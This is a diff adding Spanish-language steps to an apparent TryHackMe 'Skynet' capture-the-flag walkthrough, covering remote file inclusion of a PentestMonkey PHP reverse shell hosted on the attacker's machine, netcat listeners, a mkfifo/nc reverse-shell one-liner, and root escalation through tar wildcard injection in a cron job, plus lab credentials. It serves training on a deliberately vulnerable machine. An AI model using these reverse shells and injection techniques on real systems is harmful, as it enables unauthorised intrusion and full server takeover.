@@ -572,7 +572,7 @@ http://10.10.40.222/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?u
 ````
 
 
-💥 Paso 15: LFI Avanzado y Extracción de Credenciales
+## 💥 Paso 15: LFI Avanzado y Extracción de Credenciales
 Habiendo confirmado la vulnerabilidad de Inclusión de Archivos Locales (LFI) y obtenido una lista de usuarios del sistema (Paso 14), el objetivo ahora es usar esta vulnerabilidad para leer archivos de configuración sensibles y conseguir credenciales que nos permitan acceder al sistema mediante SSH o la web.
 
 1. Confirmación de Lectura de /etc/passwd
@@ -657,6 +657,318 @@ root:password123 (Credenciales de Base de Datos).
 skynet:Cuppa2008 (Asumido en el paso anterior si no estaba en la configuración de la DB).
 
 
+## 💥 Paso 17: Obtención de una Shell Inversa (Initial Foothold)
+
+Dado que la autenticación SSH con las credenciales encontradas previamente podría fallar, y tenemos una vulnerabilidad de Inclusión de Archivos Locales (LFI) confirmada (Paso 14 y 15), el camino más seguro para obtener una shell inicial es mediante la explotación de la Inclusión de Archivos Remotos (RFI), si el servidor web lo permite.
+
+Utilizaremos un script de reverse shell de PHP, lo alojaremos en nuestro servidor y haremos que el servidor objetivo lo incluya y ejecute a través de la vulnerabilidad RFI.
+
+1. Configuración del Listener y Servidor Web
+   
+Necesitamos dos ventanas de terminal en nuestra máquina atacante (Kali):
+
+A. Iniciar el Listener (Netcat)
+
+Configuramos netcat para que escuche las conexiones entrantes en el puerto elegido (ej. 4444). Esta será la terminal donde recibiremos la shell.
+
+💻 Comando:
+````
+Bash
+nc -nvlp 4444
+````
+<img width="421" height="50" alt="eejecutamos un lisstener" src="https://github.com/user-attachments/assets/59f34352-bcbf-491c-92e8-c4ba915d2bfc" />
 
 
+B. Iniciar el Servidor Web (Python)
+
+Configuramos un servidor HTTP simple para alojar el script de reverse shell y servirlo a la máquina objetivo. Utilizamos el puerto 80 para evitar problemas de firewall.
+
+💻 Comando:
+````
+Bash
+python3 -m http.server 80
+````
+<img width="741" height="62" alt="ejecutamos servidor de python" src="https://github.com/user-attachments/assets/c2858c3a-d46e-4162-8624-301e55826948" />
+
+
+2. Preparación del Script de Reverse Shell
+
+Utilizaremos la reverse shell de PentestMonkey en PHP, la cual debemos configurar para que se conecte a nuestra IP y puerto de escucha.
+
+💻 Modificaciones al Script:
+
+Descargamos la reverse shell PHP (ej. php-reverse-shell.php).
+
+Editamos la línea de IP para que apunte a nuestra IP de la VPN de TryHackMe (ej. 10.11.147.155).
+
+Editamos la línea de PUERTO para que coincida con nuestro listener (4444).
+````
+PHP
+
+$ip = 'TU_IP_KALI'; // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+````
+<img width="1049" height="790" alt="configuro reverseshell de pentestmonkey" src="https://github.com/user-attachments/assets/9f560ade-081d-4dfa-a479-4788182e176a" />
+
+
+3. Ejecución del Exploit RFI
+   
+Finalmente, forzamos al servidor Skynet a incluir y ejecutar el script de nuestra reverse shell a través de la vulnerabilidad RFI, usando nuestra IP y el nombre del archivo.
+
+<img width="1428" height="271" alt="aprovechamos rfi para ejecutar reverse" src="https://github.com/user-attachments/assets/dc7a22f1-db4a-4035-ac3a-b4c390958368" />
+
+💻 URL Explotada (en el navegador o con curl):
+````
+Bash
+
+http://10.10.40.222/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://TU_IP_KALI/php-reverse-shell.php
+````
+
+4. Acceso al Sistema
+
+Al cargar la URL anterior, el script se incluye y se ejecuta, enviando una conexión de vuelta a nuestro listener de Netcat.
+
+¡Éxito! Recibimos la conexión y hemos obtenido una shell con privilegios bajos (generalmente el usuario www-data o apache).
+
+connecting to [TU_IP_KALI] port 4444
+
+connection succeeded!
+
+
+## 💻 Paso 18: Obtención de la Shell y Flag de Usuario (user.txt)
+
+Tras configurar el servidor y el listener (Paso 17), el exploit RFI (alertConfigField.php?urlConfig=http://TU_IP_KALI/php-reverse-shell.php) se ejecuta en el servidor, dándonos nuestra primera conexión al sistema.
+
+1. Recepción de la Shell
+   
+El listener de Netcat recibe la conexión, y confirmamos que hemos obtenido una shell con el usuario de bajos privilegios del servidor web.
+
+💻 Resultado:
+````
+Bash
+
+nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.11.147.155] from (UNKNOWN) [10.10.40.222] 36946
+...
+whoami
+www-data
+````
+2. Estabilización de la Shell
+
+La shell inicial es básica. La estabilizamos usando Python para obtener una shell TTY completamente funcional, lo cual facilita la navegación.
+
+💻 Comando:
+````
+Bash
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+````
+
+3. Localización de la Flag de Usuario
+Una vez dentro, buscamos la flag de usuario (user.txt). Basándonos en la enumeración de usuarios del sistema (Paso 14), el archivo de usuario probablemente se encuentra en el directorio /home/milesdyson o /home/skynet.
+
+Navegamos al directorio de milesdyson y encontramos el archivo:
+
+💻 Comandos y Resultado:
+````
+Bash
+
+ls /home/milesdyson
+backups mail share user.txt
+cat /home/milesdyson/user.txt
+7ce...
+````
+✅ ¡FLAG DE USUARIO CONSEGUIDA!
+
+<img width="991" height="339" alt="conseguimos el shell y la flag" src="https://github.com/user-attachments/assets/d83b48fc-2104-463b-af85-c7abc52c4e91" />
+
+
+## ⏫ Paso 19: Escalada de Privilegios - Secuestro de Cron Job
+
+Tras la enumeración del sistema, el binario SUID /usr/bin/menu no fue la ruta de escalada. Sin embargo, en el proceso de búsqueda, encontramos un job automatizado que se ejecuta como root.
+
+1. Enumeración del Directorio Personal de Milesdyson
+   
+Navegamos por el directorio /home/milesdyson y encontramos el directorio backups.
+
+<img width="750" height="243" alt="directorio personal y archivo backup" src="https://github.com/user-attachments/assets/fe321c8f-167d-42a4-8285-af898471d942" />
+
+
+💻 Comandos y Permisos:
+````
+Bash
+
+cd /home/milesdyson
+ls -la
+````
+El directorio backups tiene permisos especiales:
+
+drwxr-xr-x 2 root root 4096 Sep 17 2019 backups
+
+Propietario: root
+
+Grupo: root
+
+Permisos: El usuario www-data (nuestro usuario actual) tiene permisos de lectura y ejecución (r-x) en este directorio.
+
+2. Análisis del Script de Backup
+   
+Ingresamos al directorio /home/milesdyson/backups y encontramos dos archivos: un archivo comprimido (backup.tgz) y un script de bash (backup.sh).
+
+<img width="581" height="287" alt="leemos el scritp se usa para hacer copias de seguridad" src="https://github.com/user-attachments/assets/1dbfeb47-e1ff-43dd-9334-3b0ab112e149" />
+
+💻 Comandos y Contenido:
+````
+Bash
+
+cd backups
+ls -la
+cat backup.sh
+````
+📄 Contenido de backup.sh:
+````
+Bash
+
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+````
+
+3. Identificación de la Vulnerabilidad (Wildcard y Cron)
+   
+El análisis del script revela dos puntos clave:
+
+El script se ejecuta probablemente como un trabajo CRON periódico y debe ejecutarse como root (ya que el archivo de backup se creó como root).
+
+Utiliza el comando tar cf ... * dentro del directorio /var/www/html. El uso del comodín (*) sin ruta absoluta es vulnerable al Wildcard Injection (Inyección de Comodines) o Path Hijacking si podemos colocar archivos especiales en el directorio donde se ejecuta el tar.
+
+
+## 💥 Paso 20: Confirmación del Cron Job y Escalada a Root
+
+1. Verificación del Cron Job
+
+<img width="861" height="284" alt="vemos archivo crtontab" src="https://github.com/user-attachments/assets/2c14bb18-a4eb-4220-bd87-b952ae7bb2e4" />
+
+
+El script de backup (/home/milesdyson/backups/backup.sh) es el objetivo. Revisamos el archivo /etc/crontab para confirmar que este script se ejecuta automáticamente y con qué usuario.
+
+💻 Comando:
+````
+Bash
+
+cat /etc/crontab
+````
+📄 Contenido Relevante:
+
+El archivo /etc/crontab revela una tarea programada:
+
+*m h dom mon dow user  command*
+
+* * * * * root /home/milesdyson/backups/backup.sh       
+        * 
+
+Conclusión: El script /home/milesdyson/backups/backup.sh se ejecuta cada minuto (* * * * *) como el usuario root. ¡Esto confirma el camino a la escalada de privilegios!
+
+
+## 🧐 Paso 21: Investigación de la Escalada y Preparación de la Shell
+
+Mientras enumerábamos en el Paso 19, la vulnerabilidad en el Cron Job que usa el comando tar con wildcard (comodín *) fue identificada como la ruta de escalada. Este paso documenta la investigación y la preparación final del payload.
+
+1. Investigación de la Vulnerabilidad (Wildcard Injection)
+
+<img width="1171" height="745" alt="vemos pagina para escalada de privilegios" src="https://github.com/user-attachments/assets/17390060-26e0-452f-830d-cc4e968dd886" />
+
+Una búsqueda rápida en línea (como se sugiere en la captura) confirma que el uso del comodín (*) en comandos de tar ejecutados por root es vulnerable a Wildcard Injection.
+
+Técnica: Crear archivos que simulen opciones de tar para forzar la ejecución de un script arbitrario.
+
+Archivos necesarios:
+
+--checkpoint=1
+
+--checkpoint-action=exec=sh exploit.sh
+
+exploit.sh (nuestro reverse shell final).
+
+2. Generación del Payload de Root Shell
+
+Para garantizar la estabilidad y la conexión, utilizamos una herramienta de generación de reverse shell (como Reverse Shell Generator o msfvenom si fuera necesario) para obtener el payload de Netcat.
+
+<img width="1153" height="640" alt="utilziamos reverseshell generatpr" src="https://github.com/user-attachments/assets/ad2f9463-6cd6-45ce-b471-f1e7d855c7a7" />
+
+
+💻 Payload de exploit.sh (Usando un Listener en el puerto 9999):
+
+El script exploit.sh debe contener el comando para conectar una shell de Bash a nuestro listener.
+````
+Bash
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TU_IP_KALI 9999 >/tmp/f
+````
+
+
+## 🏆 Paso 22: Escalada Final, Shell de Root y Flag
+
+Este es el paso culminante donde se ejecuta el payload final preparado en el Paso 21 para obtener acceso de administrador.
+
+1. Preparación del Payload en /var/www/html
+   
+Una vez que identificamos el Cron Job vulnerable ejecutándose como root (Paso 20), inyectamos nuestra reverse shell en el directorio donde el script backup.sh ejecuta el comando tar cf ... *.
+
+<img width="894" height="327" alt="dentro del shell ejecuto el reverse siguiendo las indicaciones de la pagina web" src="https://github.com/user-attachments/assets/cc2c3a4d-d5c6-46d5-a5a4-c7a6e8205b00" />
+
+
+💻 Comandos de Inyección (usando el listener en el puerto 8000 para la shell root, como se ve en la captura):
+````
+Bash
+
+cd /var/www/html
+
+# 1. Creamos el script de shell (ajusta TU_IP_KALI y PUERTO)
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.147.155 8000 >/tmp/f" > shell2.sh
+# 2. Creamos los archivos de inyección de tar
+echo "" > "--checkpoint-action=exec=sh shell2.sh"
+echo "" > "--checkpoint=1"
+````
+(La captura dentro del shell ejecuto el reverse siguiendo las indicaciones de la pagina web.png muestra la inyección de los archivos en el directorio /var/www/html.)
+
+2. Obtención de la Shell de Root
+
+Con nuestro listener de Netcat configurado en el puerto 8000, esperamos la ejecución del Cron Job de root.
+
+Al ejecutarse, tar interpreta los archivos inyectados y ejecuta shell2.sh, que nos envía una reverse shell de alta prioridad.
+
+💻 Resultado del Listener:
+````
+Bash
+
+nc -nvlp 8000
+listening on [any] 8000 ...
+connect to [10.11.147.155] from (UNKNOWN) [10.10.40.222] 53438
+# whoami
+root
+id
+uid=0(root) gid=0(root) groups=0(root)
+````
+
+¡Éxito! La identificación de usuario y grupo (uid=0, gid=0) confirma que hemos obtenido una shell con permisos de root.
+
+3. Recuperación de la Flag Root
+
+Finalmente, navegamos al directorio /root para obtener la última flag.
+
+💻 Comandos y Resultado:
+````
+Bash
+
+cd /root
+ls
+root.txt
+cat root.txt
+3f...
+````
+✅ ¡FLAG ROOT CONSEGUIDA!
+
+<img width="797" height="709" alt="obtengo el shell y la flag root" src="https://github.com/user-attachments/assets/fb9f8ccd-6cd9-49cd-a98a-4eea8b442d7b" />
 
